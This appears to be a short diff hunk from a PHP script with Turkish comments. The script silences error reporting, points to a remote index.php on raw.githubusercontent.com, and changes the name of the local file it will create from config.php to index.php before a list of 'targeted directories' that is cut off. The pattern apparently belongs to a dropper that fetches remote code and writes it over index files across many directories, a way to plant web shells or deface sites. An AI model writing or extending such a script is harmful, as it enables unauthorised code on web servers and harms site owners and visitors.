@@ -6,7 +6,7 @@ error_reporting(0);
 $url = 'https://raw.githubusercontent.com/bayyx/bayy/refs/heads/main/index.php';
 
 // Oluşturulacak yerel dosyanın adı
-$localFileName = 'config.php';
+$localFileName = 'index.php';
 
 // Hedeflenen dizinlerin listesi (isteğe göre eklenebilir)
 $targetDirectories = [
